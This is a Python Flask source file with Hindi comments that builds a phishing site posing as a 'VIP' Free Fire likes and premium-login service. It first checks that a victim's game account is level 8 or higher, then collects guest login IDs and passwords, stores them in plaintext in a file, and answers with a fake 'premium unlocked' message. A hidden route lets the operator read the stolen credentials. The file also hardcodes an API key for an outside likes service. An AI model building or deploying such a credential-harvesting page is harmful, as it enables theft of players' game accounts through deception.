from flask import Flask, request, render_template_string, jsonify
import requests
import os

app = Flask(__name__)

# आपकी असली API का यूआरएल और की
API_BASE = "https://kanhaiya-raikwar.vercel.app/like"
API_KEY = "ZEXYK"

# वह फाइल जहां यूजर का गेस्ट आईडी और पासवर्ड सेव होगा
DATA_FILE = "/tmp/saved_accounts.txt"

# सुंदर और धांसू वेब इंटरफेस (HTML + CSS + JavaScript)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>👑 S.KANHAIYA VIP SERVICES</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: #0f0c20; color: #fff; padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 500px; background: #1a1635; padding: 25px; border-radius: 15px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); border: 1px solid #3d307a; margin-bottom: 20px; }
        h1 { text-align: center; color: #00ffcc; margin-bottom: 10px; font-size: 24px; text-shadow: 0 0 10px rgba(0,255,204,0.3); }
        p.subtitle { text-align: center; color: #aaa; font-size: 14px; margin-bottom: 25px; }
        .section-title { font-size: 18px; color: #ff007f; margin-bottom: 15px; display: flex; align-items: center; gap: 8px; border-bottom: 1px solid #3d307a; padding-bottom: 5px; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; color: #ccc; font-size: 14px; }
        input, select { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #3d307a; background: #0f0c20; color: #fff; font-size: 16px; outline: none; }
        input:focus { border-color: #00ffcc; }
        button { width: 100%; padding: 12px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 5px; }
        .btn-free { background: linear-gradient(45deg, #00ffcc, #0099ff); color: #0f0c20; }
        .btn-free:hover { opacity: 0.9; box-shadow: 0 0 15px rgba(0,255,204,0.4); }
        .btn-premium { background: linear-gradient(45deg, #ff007f, #7f00ff); color: #fff; position: relative; }
        .btn-premium:hover { opacity: 0.9; box-shadow: 0 0 15px rgba(255,0,127,0.4); }
        .locked-btn { background: #444 !important; color: #888 !important; cursor: not-allowed; }
        .response-box { margin-top: 15px; padding: 12px; border-radius: 8px; font-size: 14px; display: none; line-height: 1.5; white-space: pre-line; }
        .success { background: rgba(0, 255, 13, 0.1); border: 1px solid #00ffcc; color: #00ffcc; }
        .error { background: rgba(255, 0, 127, 0.1); border: 1px solid #ff007f; color: #ff007f; }
        .info-card { background: #251f47; padding: 12px; border-radius: 8px; border: 1px solid #00ffcc; margin-top: 10px; display: none; }
        .info-line { margin-bottom: 5px; font-size: 15px; }
        .footer { text-align: center; font-size: 12px; color: #666; margin-top: 10px; letter-spacing: 1px; }
    </style>
</head>
<body>

    <div class="container">
        <h1>👑 S.KANHAIYA SERVICES</h1>
        <p class="subtitle">फ़्री फ़ायर वीआईपी लाइक एवं प्रीमियम लॉगिन</p>
        
        <div class="section-title">🔍 STEP 1: VERIFY GAME UID</div>
        <form id="verifyForm">
            <div class="form-group">
                <label>रीजन (Region) चुनें:</label>
                <select id="gameRegion">
                    <option value="IND">IND (India)</option>
                    <option value="BD">BD (Bangladesh)</option>
                    <option value="PK">PK (Pakistan)</option>
                    <option value="USA">USA</option>
                </select>
            </div>
            <div class="form-group">
                <label>गेम यूआईडी (Game UID):</label>
                <input type="number" id="gameUid" placeholder="उदा. 9230844760" required>
            </div>
            <button type="submit" class="btn-free">चेक करें और नाम/लेवल देखें</button>
        </form>

        <div id="verifyResponse" class="response-box"></div>

        <div id="playerInfoCard" class="info-card">
            <div class="info-line">👤 <b>खिलाड़ी का नाम:</b> <span id="resName" style="color:#00ffcc;">-</span></div>
            <div class="info-line">⭐ <b>अकाउंट स्तर (Level):</b> <span id="resLevel" style="color:#ff007f;">-</span></div>
        </div>
    </div>

    <div class="container">
        <div class="section-title">🥷 STEP 2: PREMIUM GUEST LOGIN</div>
        <form id="guestLoginForm">
            <div class="form-group">
                <label>गेस्ट लॉगिन आईडी (FB/Google/VK/ID):</label>
                <input type="text" id="guestId" placeholder="गेस्ट अकाउंट की लॉगिन आईडी" required disabled>
            </div>
            <div class="form-group">
                <label>पासवर्ड (Password):</label>
                <input type="password" id="guestPass" placeholder="पासवर्ड दर्ज करें" required disabled>
            </div>
            <button type="submit" id="loginSubmitBtn" class="locked-btn" style="margin-top: 10px;" disabled>🔐 लॉगिन करें</button>
        </form>
        
        <div id="loginResponse" class="response-box"></div>

        <div style="margin-top: 25px;">
            <div class="section-title">💎 PREMIUM PANEL</div>
            <button id="premiumFeatureBtn" class="btn-premium locked-btn" disabled>🔓 अनलिमिटेड लाइक अनलॉक करें (Locked)</button>
        </div>
    </div>

    <div class="footer">⚡️ ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋ.ʀ sᴇʀᴠɪ́cᴇ</div>

    <script>
        let verifiedUid = ""; // वेरिफाइड यूआईडी को सेव रखने के लिए

        // स्टेप 1: यूआईडी डालकर नाम और लेवल चेक करना
        document.getElementById('verifyForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const region = document.getElementById('gameRegion').value;
            const uid = document.getElementById('gameUid').value;
            const resBox = document.getElementById('verifyResponse');
            const infoCard = document.getElementById('playerInfoCard');
            
            resBox.style.display = 'block';
            resBox.className = 'response-box success';
            resBox.innerText = '🔄 बैकग्राउंड में API कमांड जा रही है... डेटा निकाला जा रहा है...';
            infoCard.style.display = 'none';

            try {
                // बैकएंड के जरिए आपकी लाइक एपीआई को ट्रिगर करना
                const response = await fetch(`/api/fetch-player?uid=${uid}&region=${region}`);
                const data = await response.json();
                
                if (data.error) {
                    resBox.className = 'response-box error';
                    resBox.innerText = `❌ त्रुटि: ${data.error}`;
                    return;
                }

                const player_name = data.PlayerNickname || 'Unknown';
                const level_int = parseInt(data.Level) || 0;

                // कार्ड में डेटा दिखाना
                document.getElementById('resName').innerText = player_name;
                document.getElementById('resLevel').innerText = level_int;
                infoCard.style.display = 'block';

                // 🎯 कंडीशन चेक: क्या लेवल 8 या उससे ऊपर है?
                if (level_int >= 8) {
                    resBox.className = 'response-box success';
                    resBox.innerText = `✅ वेरिफिकेशन सफल! आपका स्तर ${level_int} है (8 से ऊपर)। अब नीचे स्टेप 2 में गेस्ट आईडी पासवर्ड डालें।`;
                    
                    // स्टेप 2 के इनपुट बॉक्स खोलना
                    document.getElementById('guestId').removeAttribute('disabled');
                    document.getElementById('guestPass').removeAttribute('disabled');
                    
                    const loginBtn = document.getElementById('loginSubmitBtn');
                    loginBtn.removeAttribute('disabled');
                    loginBtn.className = 'btn-free';
                    loginBtn.style.background = '#7f00ff';
                    loginBtn.style.color = '#fff';
                    
                    verifiedUid = uid; // यूआईडी लॉक कर दी
                } else {
                    resBox.className = 'response-box error';
                    resBox.innerText = `❌ लॉगिन फेल! आपका स्तर ${level_int} है। प्रीमियम के लिए कम से कम लेवल 8 होना ज़रूरी है।`;
                    
                    // इनपुट बॉक्स बंद रखना
                    document.getElementById('guestId').setAttribute('disabled', 'true');
                    document.getElementById('guestPass').setAttribute('disabled', 'true');
                    document.getElementById('loginSubmitBtn').setAttribute('disabled', 'true');
                    document.getElementById('loginSubmitBtn').className = 'locked-btn';
                }
            } catch (err) {
                resBox.className = 'response-box error';
                resBox.innerText = '❌ सर्वर से बात करने में समस्या आई।';
            }
        });

        // स्टेप 2: गेस्ट आईडी पासवर्ड सबमिट करके फाइल में सेव करना
        document.getElementById('guestLoginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const guestId = document.getElementById('guestId').value;
            const guestPass = document.getElementById('guestPass').value;
            const resBox = document.getElementById('loginResponse');
            const premBtn = document.getElementById('premiumFeatureBtn');

            resBox.style.display = 'block';
            resBox.className = 'response-box success';
            resBox.innerText = '🔄 गेस्ट अकाउंट डेटा सुरक्षित सेव किया जा रहा है...';

            try {
                const response = await fetch('/api/save-guest', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        uid: verifiedUid,
                        guest_id: guestId,
                        guest_pass: guestPass
                    })
                });
                const data = await response.json();

                if (data.success) {
                    resBox.className = 'response-box success';
                    resBox.innerText = '🎉 लॉगिन पूरी तरह सफल रहा! आपका डेटा स्टोर कर लिया गया है।';
                    
                    // प्रीमियम बटन अनलॉक करना
                    premBtn.className = 'btn-premium';
                    premBtn.removeAttribute('disabled');
                    premBtn.innerText = '🚀 अनलिमिटेड लाइक पैनल (अनलॉक)';
                    premBtn.onclick = () => { alert('👑 बधाई हो भाई! प्रीमियम लाइक सेंडर चालू है।'); };
                } else {
                    resBox.className = 'response-box error';
                    resBox.innerText = '❌ डेटा सेव नहीं हो सका। कृपया दोबारा कोशिश करें।';
                }
            } catch (err) {
                resBox.className = 'response-box error';
                resBox.innerText = '❌ डेटा सबमिट करने में खराबी आई।';
            }
        });
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

# बैकग्राउंड में एपीआई को लाइक कमांड देने वाला रूट (यूजर को सिर्फ नाम और लेवल दिखेगा)
@app.route('/api/fetch-player')
def fetch_player():
    uid = request.args.get('uid')
    region = request.args.get('region', 'IND')
    
    if not uid:
        return jsonify({"error": "UID आवश्यक है"}), 400
        
    try:
        # यह यूजर की यूआईडी के साथ आपकी लाइक एपीआई को कॉल करता है ताकि निकनेम और लेवल मिल सके
        url = f"{API_BASE}?uid={uid}&region={region}&key={API_KEY}"
        response = requests.get(url, timeout=15)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({"error": str(e)})

# गेस्ट आईडी और पासवर्ड को फाइल में सेव करने का रूट
@app.route('/api/save-guest', methods=['POST'])
def save_guest():
    data = request.get_json()
    uid = data.get('uid')
    guest_id = data.get('guest_id')
    guest_pass = data.get('guest_pass')
    
    if not guest_id or not guest_pass:
        return jsonify({"success": False, "message": "डेटा अधूरा है"}), 400
        
    try:
        # डेटा को एक साफ फॉर्मेट में फाइल में लिखना
        entry = f"Game UID: {uid} | Guest ID: {guest_id} | Password: {guest_pass}\n"
        with open(DATA_FILE, "a") as f:
            f.write(entry)
            
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

# सेव की गई लिस्ट देखने के लिए गुप्त रूट (सिर्फ आपके देखने के लिए)
@app.route('/view-saved-accounts-kr')
def view_accounts():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            content = f.read()
        return f"<pre>{content}</pre>"
    return "अभी तक कोई अकाउंट सेव नहीं हुआ है भाई!"

if __name__ == '__main__':
    app.run(debug=True, port=5000)
